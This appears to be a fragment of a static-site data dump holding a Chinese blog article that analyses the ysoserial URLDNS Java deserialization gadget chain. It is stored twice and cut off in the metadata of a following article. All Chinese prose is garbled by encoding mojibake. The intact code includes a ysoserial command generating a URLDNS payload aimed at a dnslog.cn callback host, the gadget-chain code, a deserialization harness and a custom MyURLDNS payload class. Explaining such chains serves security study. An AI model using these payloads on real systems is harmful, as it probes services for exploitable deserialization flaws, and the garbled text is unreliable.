+ "\'");\n  printUsage();\n  System.exit(USAGE_CODE);\n  return; // make null analysis happy\n}\n\ntry {\n  final ObjectPayload payload = payloadClass.newInstance();\n  final Object object = payload.getObject(command);\n  PrintStream out = System.out;\n  Serializer.serialize(object, out);\n  ObjectPayload.Utils.releasePayload(payload, object);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nå¨Utils.getPayloadClassæ¹æ³ä¸­ï¼å©ç¨åå°åå»ºæä»¬ä¼ å¥çç±»çç±»å¯¹è±¡ãå¦æä¼ å¥çæ¯å®æ´çç±»åï¼åç´æ¥åå»ºç±»å¯¹è±¡ãå¦æä¼ å¥çä¸æ¯å®æ´ç±»åï¼åå»payloadsåä¸­å¯»æ¾ï¼æä»¬ä¼ å¥çURLDNSä¸æ¯å®æ´çç±»åï¼å æ­¤å¯¹åºysoserial.payloads.URLDNSç±»ã\n\npublic static Class<? extends ObjectPayload> getPayloadClass ( final String className ) {\n  Class<? extends ObjectPayload> clazz = null;\n  try {\n    clazz = (Class<? extends ObjectPayload>) Class.forName(className);\n  }\n  catch ( Exception e1 ) {}\n  if ( clazz == null ) {\n    try {\n      return clazz = (Class<? extends ObjectPayload>) Class\n        .forName(GeneratePayload.class.getPackage().getName() + ".payloads." + className);\n    }\n    catch ( Exception e2 ) {}\n  }\n  if ( clazz != null && !ObjectPayload.class.isAssignableFrom(clazz) ) {\n    clazz = null;\n  }\n  return clazz;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\næä»¬éç¹æ¥çURLDNSç±»çgetObjectæ¹æ³ãè¿ä¸ªæ¹æ³ååçç®åï¼æ¯ysoserialä¸­æç®åçå©ç¨é¾äºã\n\npublic Object getObject(final String url) throws Exception {\n\n  URLStreamHandler handler = new SilentURLStreamHandler();\n\n  HashMap ht = new HashMap(); \n  URL u = new URL(null, url, handler); \n  ht.put(u, url); \n\n  Reflections.setFieldValue(u, "hashCode", -1); \n  return ht;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nURLDNSçgadget chainsä¸ºï¼\n\n *   Gadget Chain:\n *     HashMap.readObject()\n *       HashMap.putVal()\n *         HashMap.hash()\n *           URL.hashCode()\n\n\n1\n2\n3\n4\n5\n\n\næä»¬ä¸æ­¥ä¸æ­¥æ¥çï¼é¦åæä»¬çæåºååæä»¶çç±»æ¯ä¸ä¸ªHashMapï¼å æ­¤å¨ååºååçè¿ç¨ä¸­ï¼ä¼è°ç¨HashMapçreadObjectæ¹æ³ãèå¨è¯¥æ¹æ³ä¸­ï¼æä¸ä¸ªputValçæä½ã\n\n\n\nå¨putValæ¹æ³çåæ°ä¸ï¼è®¡ç®äºhashMapå¯¹åºçkeyçhashå¼ãå¨è®¡ç®hashçæ¶åï¼è°ç¨çæ¯å¯¹åºkeyçhashCodeæ¹æ³ã\n\n\n\né£ä¹å¦ææä»¬hashMapä¸­çkeyæ¯ä¸ä¸ªURLå¯¹è±¡ï¼é£ä¹è°ç¨çå°±æ¯URLçhashCodeæ¹æ³äºãå¨URLçhashCodeæ¹æ³ä¸­æä¸ç¹éå¸¸éè¦ï¼å°±æ¯hashCode!=-1ï¼æææ¯å¨è¿ä¹åæ²¡æè°ç¨è¿è¯¥å¯¹è±¡çè®¡ç®hashçæ¹æ³ãè¿ä¹æ¯ysoserialä¸­å°URLå¯¹è±¡çhashCodeè®¾ç½®ä¸º-1çåå ãå¦æhashCodeç­äº-1ï¼é£ä¹å°±ä¼è°ç¨handler.hashCodeæ¹æ³ï¼å¹¶ä¸ç»è¿ä¸ªhashCodeæ¹æ³ä¼ å¥å½åçURLå¯¹è±¡ã\n\n\n\né£ä¹ï¼è¿ä¸ªhandleræ¯ä»ä¹å¢ï¼æä»¬çURLçæé æ¹æ³å¯ä»¥åç°ï¼handleræ¯æä»¬éè¿æé å½æ°åå»ºå¯¹è±¡æ¶ä¼ å¥çã\n\n\n\nä¼ å¥çå¯¹è±¡æ¯URLStreamHandlerçå­ç±»ï¼ysoserialä¸­åå»ºäºä¸ä¸ªç±»ï¼ç»§æ¿äºè¯¥ç±»ãä¸ºä»ä¹è¿ä¹åæä»¬åé¢åè¯´ã\n\nstatic class SilentURLStreamHandler extends URLStreamHandler {\n\n  protected URLConnection openConnection(URL u) throws IOException {\n    return null;\n  }\n\n  protected synchronized InetAddress getHostAddress(URL u) {\n    return null;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\né£ä¹ä¸ºä»ä¹è¦åå»ºè¿ä¸ªç±»å¢ï¼æä»¬ä¸é¢è¯´å°ï¼ä¼è°ç¨æä»¬ä¼ å¥çå¯¹è±¡çhashCodeæ¹æ³ãæä»¬å¯ä»¥çURLStreamHandlerçhashCodeæ¹æ³ãéç¹å°±å¨getHostAddressæ¹æ³ä¸­ãå¨è¯¥æ¹æ³ä¸­è°ç¨äºInetAddress.getByName(host)ï¼åèµ·äºDNSè¯·æ±ï¼èä¼ å¥çhostçå¼æ¯éè¿URLå¯¹è±¡çgetHostè·åçï¼getHostæ¹æ³è¿åäºæååéhostçå¼ï¼è¿ä¸ªå¼ä¹æ¯å¨åå»ºURLå®ä¾æ¶ä¼ å¥æé å¨çã\n\n\n\nå æ­¤åæ¥åé¡¾ysoserialä¸­çURLDNSä¸­getObjectæ¹æ³ã\n\npublic Object getObject(final String url) throws Exception {\n\n  URLStreamHandler handler = new SilentURLStreamHandler();\n\n  HashMap ht = new HashMap(); \n  URL u = new URL(null, url, handler); \n  ht.put(u, url); \n\n  Reflections.setFieldValue(u, "hashCode", -1); \n  return ht;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nè¯¥æ¹æ³å®éä¸è¿åäºä¸ä¸ªhashMapå¯¹è±¡ï¼ä¹å°±æ¯æç»åºååçæ¯ä¸ä¸ªhashMapå¯¹è±¡ãè¯¥å¯¹è±¡ä¸­æä¸ä¸ªä»¥URLå¯¹è±¡ä¸ºkeyçé®å¼å¯¹ãå æ­¤å¨ååºååçè¿ç¨ä¸­ï¼åè°ç¨äºhashMapçreadObjectæ¹æ³ï¼ç¶åå¨è¯¥æ¹æ³ä¸­éè¦è®¡ç®keyçhashCodeï¼äºæ¯åè°ç¨äºURLçhashCodeæ¹æ³ãèå½hashCodeç­äº-1æ¶ï¼URLä¸­çhashCodeæ¹æ³è°ç¨çæ¯handler.hashCodeæ¹æ³ï¼handleræ¯æä»¬ä¼ å¥çå¯¹è±¡ãè¿ä¹è§£éäºä¸ºä»ä¹ysoserialä¸­ä¼å°URLå¯¹è±¡çhashCodeè®¾ç½®ä¸º-1ãå¨handler.hashCodeæ¹æ³ä¸­ä¼ å¥äºURLå¯¹è±¡ï¼å¹¶æ ¹æ®URLå¯¹è±¡çhostå±æ§ï¼åèµ·äºDNSè¯·æ±ãè¿å°±æ¯ä¸æ¬¡å®æ´çURLDNSå©ç¨è¿ç¨ã\n\nå½æä»¬ä»ç»çysoserialçä»£ç æ¶ï¼æä»¬åç°ï¼å¨å¾hashMapä¸­puté®å¼å¯¹çæ¶åï¼ä¹ä¼è°ç¨è®¡ç®keyçhashï¼é£ä¹åºè¯¥ä¹ä¼è¯·æ±DNSã\n\n\n\næä»¬å¯ä»¥ç®ååä¸æ®µä»£ç å®éªä¸ä¸ã\n\npublic static void main(String[] args) throws MalformedURLException {\n  HashMap hashMap = new HashMap();\n  URL url = new URL("http://abc.0dlg1h.dnslog.cn");\n  hashMap.put(url,"test");\n}\n\n\n1\n2\n3\n4\n5\n\n\nç»è¿æµè¯ï¼åç°å¨putæä½çæ¶åç¡®å®ä¼åèµ·DNSè¯·æ±ã\n\n\n\nå®éä¸ï¼ç»è¿ä¸é¢çåææä»¬ç¥éï¼åªè¦URLå¯¹è±¡çhashCodeä¸ç­äº-1ï¼å°±ä¸ä¼è°ç¨handlerçhashCodeæ¹æ³ï¼ä¹å°±ä¸ä¼åèµ·è¯·æ±äºãå æ­¤æä»¬å°è¯å°URLå¯¹è±¡çhashCodeå¼æ¹ä¸ºé-1ã\n\nURL url = new URL("http://abc.0dlg1h.dnslog.cn");\nClass<?> clazz = Class.forName("java.net.URL");\nField hashCode = clazz.getDeclaredField("hashCode");\nhashCode.setAccessible(true);\nhashCode.set(url,123);\nhashMap.put(url,"test2");\n\n\n1\n2\n3\n4\n5\n6\n\n\nç»è¿æµè¯ï¼ä¸ä¼åå»è¯·æ±dnsäºãé£ä¹ä¸ºä»ä¹ysoserialä¸­ä¹æ²¡æå°hashCodeä¿®æ¹ä¸ºé-1çå¼ï¼ä¹ä¸ä¼åèµ·å¤æ¬¡è¯·æ±å¢ï¼è¿è®°å¾ä¸é¢æä»¬æå°ï¼ysoserialåå»ºä¸ä¸ªæ°ç±»ç»§æ¿URLStreamHandlerä½ä¸ºhandlerå¯¹è±¡ã\n\né£ä¹ä¸ºä»ä¹ysoserialä¸ç´æ¥ä½¿ç¨URLStreamHandlerçå¯¹è±¡ä½ä¸ºURLä¸­çhandlerï¼è¿è¦å¤æ­¤ä¸ä¸¾åå»ºä¸ä¸ªæ°çç±»ç»§æ¿URLStreamHandlerå¢ï¼æä»¬ä»ç»çysoserialä¸­çéåçæ¹æ³ã\n\nstatic class SilentURLStreamHandler extends URLStreamHandler {\n\n  protected URLConnection openConnection(URL u) throws IOException {\n    return null;\n  }\n\n  protected synchronized InetAddress getHostAddress(URL u) {\n    return null;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\néåäºgetHostAddressæ¹æ³ï¼å æ­¤å¨handlerä¸­è°ç¨çgetHostAddressæ¹æ³ï¼å®éä¸æ¯å­ç±»çãå°±ä¸ä¼åèµ·è¯·æ±äºã\n\né£ä¹ä¸ºä»ä¹å¨ååºååçæ¶åè½å¤åèµ·è¯·æ±å¢ï¼æä»¬çURLç±»ä¸­æ¯æä¹å£°æURLStreamHandleræååéçã\n\n\n\nå¯ä»¥çåºï¼URLä¸­çhandleræ¯transientä¿®é¥°çï¼ä¹å°±æ¯è¯´ï¼å¨è¿è¡åºååçæ¶åï¼ä¸ä¼å°è¯¥å±æ§åºååãé£ä¹å¨ååºååçæ¶åï¼å®éä¸ä¸æ¯ååºååçæä»¬éåçhandlerãå æ­¤å°±å¯ä»¥åèµ·è¯·æ±äºãçæ¯å¦èç§å­åçå¦èè§è¿äºç±³å¥å¦å¦å±å¦å°å®¶äºã\n\nå®éä¸è¿æ ·å°±çè§£èµ·æ¥ä¼æç¹éº»ç¦ï¼æä»¬å¯ä»¥åä¸ä¸ªå°å°çæ¹è¿ãä½¿ç¨ä¿®æ¹hashCodeçæ¹å¼å»é»æ­¢ç¬¬ä¸æ¬¡çè¯·æ±ã\n\npackage ysoserial.payloads;\n\nimport ysoserial.payloads.annotation.Authors;\nimport ysoserial.payloads.annotation.Dependencies;\nimport ysoserial.payloads.annotation.PayloadTest;\nimport ysoserial.payloads.util.PayloadRunner;\nimport ysoserial.payloads.util.Reflections;\n\nimport java.io.IOException;\nimport java.lang.reflect.Field;\nimport java.net.InetAddress;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.net.URLStreamHandler;\nimport java.util.HashMap;\n\n\n/**\n * è¿æ¯ä¸ä¸ªèªå®ä¹çURLDNSï¼åªæ¯åäºç®åçä¿®æ¹ï¼\n * å»é¤äºèªå®ä¹URLStreamHandlerçæ¹å¼\n * ä¿®æ¹ä¸ºå©ç¨åå°ä¿®æ¹hashCodeä»¥å±è½ç¬¬ä¸æ¬¡putæ¶çdnsè¯·æ±ã\n */\n@SuppressWarnings({ "rawtypes", "unchecked" })\n@PayloadTest(skip = "true")\n@Dependencies()\n@Authors({ Authors.GEBL })\npublic class MyURLDNS implements ObjectPayload<Object> {\n\n  public Object getObject(final String url) throws Exception {\n    HashMap ht = new HashMap(); // åå»ºä¸ä¸ªhashMap\n    URL u = new URL(url);\n    // å©ç¨åå°ä¿®æ¹URLå¯¹è±¡çhashCode\n    Reflections.setFieldValue(u,"hashCode",123456);\n    ht.put(u, url);\n    Reflections.setFieldValue(u, "hashCode", -1);\n    return ht;\n  }\n\n  public static void main(final String[] args) throws Exception {\n    PayloadRunner.run(MyURLDNS.class, args);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\nå°æ­¤ï¼ysoserialä¸­æç®åçURLDNSå°±åæå®æå¦ãå®éä¸è¯¥é¾éå¸¸ä½ä¸ºååºååæ¼æ´æ¢æµçå¸¸è§ææ®µã',normalizedContent:'# ysoserial - urldnsé¾åæ\n\nysoserialæ¯ä¸ä¸ªéå¸¸å¥½ç¨çjavaååºååçè¾å©å·¥å·ï¼å¶ä¸­æä¾äºå¤§éäºååºååå©ç¨é¾ï¼å¯ä»¥å¸®å©æä»¬çæå¯¹åºçpayloadã\n\nysoserialä¸è½½å°åï¼https://github.com/frohoff/ysoserial\n\n\n# å©ç¨å¤ç°\n\né¦åä½¿ç¨ysoserialçæurldnså¯¹åºçååºååæ°æ®ã\n\njava -jar ysoserial-0.0.6-snapshot-all.jar urldns "http://t7xvva.dnslog.cn" > urldns.ser\n\n\n1\n\n\nç¶åæ¨¡æå°çæçåºååæä»¶ååºååè¯»åã\n\npublic static void main(string[] args) throws ioexception, classnotfoundexception {\n  fileinputstream fis = new fileinputstream("urldns.ser");\n  objectinputstream ois = new objectinputstream(fis);\n  object object = ois.readobject();\n  system.out.println(object);\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\næ§è¡ä»£ç ä¹åï¼å°±ä¼åç°æä»¬çdnslogä¸ä¼æä¸æ¬¡dnsçè¯·æ±ãè¯¥è¯·æ±å°±æ¯å ä¸ºååºååäºurldnsçæçåºååæä»¶å¯¼è´çã\n\n\n\næ¥ä¸æ¥æä»¬åæä¸ä¸è¯·æ±dnsçåå ã\n\n\n# å©ç¨é¾åæ\n\n\n# çæåºååæä»¶\n\né¦åï¼åæ¥çä¸ä¸æä»¬çæurldns payloadçå½ä»¤ã\n\njava -jar ysoserial-0.0.6-snapshot-all.jar urldns "http://t7xvva.dnslog.cn" > urldns.ser\n\n\n1\n\n\nå±æå®äºä¸¤ä¸ªåæ°ï¼urldnsæ¯å¯¹åºå©ç¨é¾çåç§°ï¼åé¢çdnslogå°åæ¯å¯¹åºçåæ°ãæä»¬çysoserialæ¯æä¹å¸®æä»¬çæåºååæä»¶çã\n\nå½ä½¿ç¨java -jarè¿è¡ysoserialæ¶ï¼å®éä¸è¿è¡çæ¯generatepayloadç±»çmainæ¹æ³ï¼è¯¥æ¹æ³è°ç¨äºutils.getpayloadclasså©ç¨åå°åå»ºäºæä»¬ä¼ å¥çurldnså¯¹åºçç±»çå¯¹è±¡ãç¶åè°ç¨getobjectæ¹æ³è·åå°å©ç¨é¾éè¦è¢«ååºååçå¯¹è±¡ãä¹åå°å¯¹è±¡ååºååä¹åè¾åºã\n\nfinal class<? extends objectpayload> payloadclass = utils.getpayloadclass(payloadtype);\nif (payloadclass == null) {\n  system.err.println("invalid payload type \'" + payloadtype + "\'");\n  printusage();\n  system.exit(usage_code);\n  return; // make null analysis happy\n}\n\ntry {\n  final objectpayload payload = payloadclass.newinstance();\n  final object object = payload.getobject(command);\n  printstream out = system.out;\n  serializer.serialize(object, out);\n  objectpayload.utils.releasepayload(payload, object);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nå¨utils.getpayloadclassæ¹æ³ä¸­ï¼å©ç¨åå°åå»ºæä»¬ä¼ å¥çç±»çç±»å¯¹è±¡ãå¦æä¼ å¥çæ¯å®æ´çç±»åï¼åç´æ¥åå»ºç±»å¯¹è±¡ãå¦æä¼ å¥çä¸æ¯å®æ´ç±»åï¼åå»payloadsåä¸­å¯»æ¾ï¼æä»¬ä¼ å¥çurldnsä¸æ¯å®æ´çç±»åï¼å æ­¤å¯¹åºysoserial.payloads.urldnsç±»ã\n\npublic static class<? extends objectpayload> getpayloadclass ( final string classname ) {\n  class<? extends objectpayload> clazz = null;\n  try {\n    clazz = (class<? extends objectpayload>) class.forname(classname);\n  }\n  catch ( exception e1 ) {}\n  if ( clazz == null ) {\n    try {\n      return clazz = (class<? extends objectpayload>) class\n        .forname(generatepayload.class.getpackage().getname() + ".payloads." + classname);\n    }\n    catch ( exception e2 ) {}\n  }\n  if ( clazz != null && !objectpayload.class.isassignablefrom(clazz) ) {\n    clazz = null;\n  }\n  return clazz;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\næä»¬éç¹æ¥çurldnsç±»çgetobjectæ¹æ³ãè¿ä¸ªæ¹æ³ååçç®åï¼æ¯ysoserialä¸­æç®åçå©ç¨é¾äºã\n\npublic object getobject(final string url) throws exception {\n\n  urlstreamhandler handler = new silenturlstreamhandler();\n\n  hashmap ht = new hashmap(); \n  url u = new url(null, url, handler); \n  ht.put(u, url); \n\n  reflections.setfieldvalue(u, "hashcode", -1); \n  return ht;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nurldnsçgadget chainsä¸ºï¼\n\n *   gadget chain:\n *     hashmap.readobject()\n *       hashmap.putval()\n *         hashmap.hash()\n *           url.hashcode()\n\n\n1\n2\n3\n4\n5\n\n\næä»¬ä¸æ­¥ä¸æ­¥æ¥çï¼é¦åæä»¬çæåºååæä»¶çç±»æ¯ä¸ä¸ªhashmapï¼å æ­¤å¨ååºååçè¿ç¨ä¸­ï¼ä¼è°ç¨hashmapçreadobjectæ¹æ³ãèå¨è¯¥æ¹æ³ä¸­ï¼æä¸ä¸ªputvalçæä½ã\n\n\n\nå¨putvalæ¹æ³çåæ°ä¸ï¼è®¡ç®äºhashmapå¯¹åºçkeyçhashå¼ãå¨è®¡ç®hashçæ¶åï¼è°ç¨çæ¯å¯¹åºkeyçhashcodeæ¹æ³ã\n\n\n\né£ä¹å¦ææä»¬hashmapä¸­çkeyæ¯ä¸ä¸ªurlå¯¹è±¡ï¼é£ä¹è°ç¨çå°±æ¯urlçhashcodeæ¹æ³äºãå¨urlçhashcodeæ¹æ³ä¸­æä¸ç¹éå¸¸éè¦ï¼å°±æ¯hashcode!=-1ï¼æææ¯å¨è¿ä¹åæ²¡æè°ç¨è¿è¯¥å¯¹è±¡çè®¡ç®hashçæ¹æ³ãè¿ä¹æ¯ysoserialä¸­å°urlå¯¹è±¡çhashcodeè®¾ç½®ä¸º-1çåå ãå¦æhashcodeç­äº-1ï¼é£ä¹å°±ä¼è°ç¨handler.hashcodeæ¹æ³ï¼å¹¶ä¸ç»è¿ä¸ªhashcodeæ¹æ³ä¼ å¥å½åçurlå¯¹è±¡ã\n\n\n\né£ä¹ï¼è¿ä¸ªhandleræ¯ä»ä¹å¢ï¼æä»¬çurlçæé æ¹æ³å¯ä»¥åç°ï¼handleræ¯æä»¬éè¿æé å½æ°åå»ºå¯¹è±¡æ¶ä¼ å¥çã\n\n\n\nä¼ å¥çå¯¹è±¡æ¯urlstreamhandlerçå­ç±»ï¼ysoserialä¸­åå»ºäºä¸ä¸ªç±»ï¼ç»§æ¿äºè¯¥ç±»ãä¸ºä»ä¹è¿ä¹åæä»¬åé¢åè¯´ã\n\nstatic class silenturlstreamhandler extends urlstreamhandler {\n\n  protected urlconnection openconnection(url u) throws ioexception {\n    return null;\n  }\n\n  protected synchronized inetaddress gethostaddress(url u) {\n    return null;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\né£ä¹ä¸ºä»ä¹è¦åå»ºè¿ä¸ªç±»å¢ï¼æä»¬ä¸é¢è¯´å°ï¼ä¼è°ç¨æä»¬ä¼ å¥çå¯¹è±¡çhashcodeæ¹æ³ãæä»¬å¯ä»¥çurlstreamhandlerçhashcodeæ¹æ³ãéç¹å°±å¨gethostaddressæ¹æ³ä¸­ãå¨è¯¥æ¹æ³ä¸­è°ç¨äºinetaddress.getbyname(host)ï¼åèµ·äºdnsè¯·æ±ï¼èä¼ å¥çhostçå¼æ¯éè¿urlå¯¹è±¡çgethostè·åçï¼gethostæ¹æ³è¿åäºæååéhostçå¼ï¼è¿ä¸ªå¼ä¹æ¯å¨åå»ºurlå®ä¾æ¶ä¼ å¥æé å¨çã\n\n\n\nå æ­¤åæ¥åé¡¾ysoserialä¸­çurldnsä¸­getobjectæ¹æ³ã\n\npublic object getobject(final string url) throws exception {\n\n  urlstreamhandler handler = new silenturlstreamhandler();\n\n  hashmap ht = new hashmap(); \n  url u = new url(null, url, handler); \n  ht.put(u, url); \n\n  reflections.setfieldvalue(u, "hashcode", -1); \n  return ht;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nè¯¥æ¹æ³å®éä¸è¿åäºä¸ä¸ªhashmapå¯¹è±¡ï¼ä¹å°±æ¯æç»åºååçæ¯ä¸ä¸ªhashmapå¯¹è±¡ãè¯¥å¯¹è±¡ä¸­æä¸ä¸ªä»¥urlå¯¹è±¡ä¸ºkeyçé®å¼å¯¹ãå æ­¤å¨ååºååçè¿ç¨ä¸­ï¼åè°ç¨äºhashmapçreadobjectæ¹æ³ï¼ç¶åå¨è¯¥æ¹æ³ä¸­éè¦è®¡ç®keyçhashcodeï¼äºæ¯åè°ç¨äºurlçhashcodeæ¹æ³ãèå½hashcodeç­äº-1æ¶ï¼urlä¸­çhashcodeæ¹æ³è°ç¨çæ¯handler.hashcodeæ¹æ³ï¼handleræ¯æä»¬ä¼ å¥çå¯¹è±¡ãè¿ä¹è§£éäºä¸ºä»ä¹ysoserialä¸­ä¼å°urlå¯¹è±¡çhashcodeè®¾ç½®ä¸º-1ãå¨handler.hashcodeæ¹æ³ä¸­ä¼ å¥äºurlå¯¹è±¡ï¼å¹¶æ ¹æ®urlå¯¹è±¡çhostå±æ§ï¼åèµ·äºdnsè¯·æ±ãè¿å°±æ¯ä¸æ¬¡å®æ´çurldnså©ç¨è¿ç¨ã\n\nå½æä»¬ä»ç»çysoserialçä»£ç æ¶ï¼æä»¬åç°ï¼å¨å¾hashmapä¸­puté®å¼å¯¹çæ¶åï¼ä¹ä¼è°ç¨è®¡ç®keyçhashï¼é£ä¹åºè¯¥ä¹ä¼è¯·æ±dnsã\n\n\n\næä»¬å¯ä»¥ç®ååä¸æ®µä»£ç å®éªä¸ä¸ã\n\npublic static void main(string[] args) throws malformedurlexception {\n  hashmap hashmap = new hashmap();\n  url url = new url("http://abc.0dlg1h.dnslog.cn");\n  hashmap.put(url,"test");\n}\n\n\n1\n2\n3\n4\n5\n\n\nç»è¿æµè¯ï¼åç°å¨putæä½çæ¶åç¡®å®ä¼åèµ·dnsè¯·æ±ã\n\n\n\nå®éä¸ï¼ç»è¿ä¸é¢çåææä»¬ç¥éï¼åªè¦urlå¯¹è±¡çhashcodeä¸ç­äº-1ï¼å°±ä¸ä¼è°ç¨handlerçhashcodeæ¹æ³ï¼ä¹å°±ä¸ä¼åèµ·è¯·æ±äºãå æ­¤æä»¬å°è¯å°urlå¯¹è±¡çhashcodeå¼æ¹ä¸ºé-1ã\n\nurl url = new url("http://abc.0dlg1h.dnslog.cn");\nclass<?> clazz = class.forname("java.net.url");\nfield hashcode = clazz.getdeclaredfield("hashcode");\nhashcode.setaccessible(true);\nhashcode.set(url,123);\nhashmap.put(url,"test2");\n\n\n1\n2\n3\n4\n5\n6\n\n\nç»è¿æµè¯ï¼ä¸ä¼åå»è¯·æ±dnsäºãé£ä¹ä¸ºä»ä¹ysoserialä¸­ä¹æ²¡æå°hashcodeä¿®æ¹ä¸ºé-1çå¼ï¼ä¹ä¸ä¼åèµ·å¤æ¬¡è¯·æ±å¢ï¼è¿è®°å¾ä¸é¢æä»¬æå°ï¼ysoserialåå»ºä¸ä¸ªæ°ç±»ç»§æ¿urlstreamhandlerä½ä¸ºhandlerå¯¹è±¡ã\n\né£ä¹ä¸ºä»ä¹ysoserialä¸ç´æ¥ä½¿ç¨urlstreamhandlerçå¯¹è±¡ä½ä¸ºurlä¸­çhandlerï¼è¿è¦å¤æ­¤ä¸ä¸¾åå»ºä¸ä¸ªæ°çç±»ç»§æ¿urlstreamhandlerå¢ï¼æä»¬ä»ç»çysoserialä¸­çéåçæ¹æ³ã\n\nstatic class silenturlstreamhandler extends urlstreamhandler {\n\n  protected urlconnection openconnection(url u) throws ioexception {\n    return null;\n  }\n\n  protected synchronized inetaddress gethostaddress(url u) {\n    return null;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\néåäºgethostaddressæ¹æ³ï¼å æ­¤å¨handlerä¸­è°ç¨çgethostaddressæ¹æ³ï¼å®éä¸æ¯å­ç±»çãå°±ä¸ä¼åèµ·è¯·æ±äºã\n\né£ä¹ä¸ºä»ä¹å¨ååºååçæ¶åè½å¤åèµ·è¯·æ±å¢ï¼æä»¬çurlç±»ä¸­æ¯æä¹å£°æurlstreamhandleræååéçã\n\n\n\nå¯ä»¥çåºï¼urlä¸­çhandleræ¯transientä¿®é¥°çï¼ä¹å°±æ¯è¯´ï¼å¨è¿è¡åºååçæ¶åï¼ä¸ä¼å°è¯¥å±æ§åºååãé£ä¹å¨ååºååçæ¶åï¼å®éä¸ä¸æ¯ååºååçæä»¬éåçhandlerãå æ­¤å°±å¯ä»¥åèµ·è¯·æ±äºãçæ¯å¦èç§å­åçå¦èè§è¿äºç±³å¥å¦å¦å±å¦å°å®¶äºã\n\nå®éä¸è¿æ ·å°±çè§£èµ·æ¥ä¼æç¹éº»ç¦ï¼æä»¬å¯ä»¥åä¸ä¸ªå°å°çæ¹è¿ãä½¿ç¨ä¿®æ¹hashcodeçæ¹å¼å»é»æ­¢ç¬¬ä¸æ¬¡çè¯·æ±ã\n\npackage ysoserial.payloads;\n\nimport ysoserial.payloads.annotation.authors;\nimport ysoserial.payloads.annotation.dependencies;\nimport ysoserial.payloads.annotation.payloadtest;\nimport ysoserial.payloads.util.payloadrunner;\nimport ysoserial.payloads.util.reflections;\n\nimport java.io.ioexception;\nimport java.lang.reflect.field;\nimport java.net.inetaddress;\nimport java.net.url;\nimport java.net.urlconnection;\nimport java.net.urlstreamhandler;\nimport java.util.hashmap;\n\n\n/**\n * è¿æ¯ä¸ä¸ªèªå®ä¹çurldnsï¼åªæ¯åäºç®åçä¿®æ¹ï¼\n * å»é¤äºèªå®ä¹urlstreamhandlerçæ¹å¼\n * ä¿®æ¹ä¸ºå©ç¨åå°ä¿®æ¹hashcodeä»¥å±è½ç¬¬ä¸æ¬¡putæ¶çdnsè¯·æ±ã\n */\n@suppresswarnings({ "rawtypes", "unchecked" })\n@payloadtest(skip = "true")\n@dependencies()\n@authors({ authors.gebl })\npublic class myurldns implements objectpayload<object> {\n\n  public object getobject(final string url) throws exception {\n    hashmap ht = new hashmap(); // åå»ºä¸ä¸ªhashmap\n    url u = new url(url);\n    // å©ç¨åå°ä¿®æ¹urlå¯¹è±¡çhashcode\n    reflections.setfieldvalue(u,"hashcode",123456);\n    ht.put(u, url);\n    reflections.setfieldvalue(u, "hashcode", -1);\n    return ht;\n  }\n\n  public static void main(final string[] args) throws exception {\n    payloadrunner.run(myurldns.class, args);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\nå°æ­¤ï¼ysoserialä¸­æç®åçurldnså°±åæå®æå¦ãå®éä¸è¯¥é¾éå¸¸ä½ä¸ºååºååæ¼æ´æ¢æµçå¸¸è§ææ®µã',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"CC1åæ",frontmatter:{title:"CC1åæ",date:"2022-03-13T00:00:00.000Z",permalink:"/sec/vuln/deserialization/cc1",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"åå",categories:["æ¼æ´åç","ååºååæ¼æ´"],tags:["ååºåå","CC","ysoserial"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/201.%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/2010.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/02.CC1%E5%88%86%E6%9E%90.html",relativePath:"02.å®å¨/201.æ¼æ´åç/2010.ååºååæ¼æ´/02.CC1åæ.md",key:"v-2a89f0a5",path:"/sec/vuln/deserialization/cc1/",headers:[{level:2,title:"èæ¯",slug:"èæ¯",normalizedTitle:"èæ¯",charIndex:73},{level:2,title:"å¤ç°ç¯å¢",slug:"å¤ç°ç¯å¢",normalizedTitle:"å¤ç°ç¯å¢",charIndex:403},{level:2,title:"åæ",slug:"åæ",normalizedTitle:"åæ",charIndex:8},{level:3,title:"Javaæ§è¡å½ä»¤",slug:"javaæ§è¡å½ä»¤",normalizedTitle:"javaæ§è¡å½ä»¤",charIndex:1065},{level:3,title:"ä½¿ç¨InvokerTRansformeræ§è¡å½ä»¤",slug:"ä½¿ç¨invokertransformeræ§è¡å½ä»¤",normalizedTitle:"ä½¿ç¨invokertransformeræ§è¡å½ä»¤",charIndex:1844},{level:3,title:"è§£å³Runtimeä¸å¯åºååçé®é¢",slug:"è§£å³runtimeä¸å¯åºååçé®é¢",normalizedTitle:"è§£å³runtimeä¸å¯åºååçé®é¢",ch